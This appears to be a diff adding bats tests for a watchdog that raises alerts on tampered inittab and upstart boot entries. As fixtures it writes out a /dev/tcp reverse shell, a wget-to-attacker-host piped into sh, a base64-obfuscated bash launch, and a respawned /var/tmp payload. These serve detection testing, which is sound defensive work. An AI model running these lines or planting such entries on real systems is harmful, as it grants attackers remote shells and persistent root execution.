@@ -150,3 +150,70 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — inittab inventory enumerates boot-time root-exec surface)" {
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (reverse-shell pattern in respawn): /dev/tcp reverse shell → alert" {
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
+    run_wd
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\nrs:5:respawn:bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${INITTAB}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh in once): wget bootstrap → alert" {
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
+    run_wd
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\nwg:5:once:wget -qO- http://attacker/p | sh\n' > "${INITTAB}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe in sysinit): obfuscation → alert" {
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
+    run_wd
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\nb64::sysinit:echo YmFzaCAtaQ== | base64 -d | bash\n' > "${INITTAB}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (respawn under /var/tmp): writable-root expansion" {
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
+    run_wd
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\nx1:5:respawn:/var/tmp/.attacker-payload\n' > "${INITTAB}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (upstart exec carries an injection pattern): upstart axis also covered" {
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
+    run_wd
+    printf 'start on runlevel [2345]\nexec bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${UPSTART}/evil.conf"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (world-writable inittab file → alert)" {
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
+    run_wd
+    chmod 0666 "${INITTAB}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-inittab -- ')
+    [ "${main_count}" = "1" ]
+}
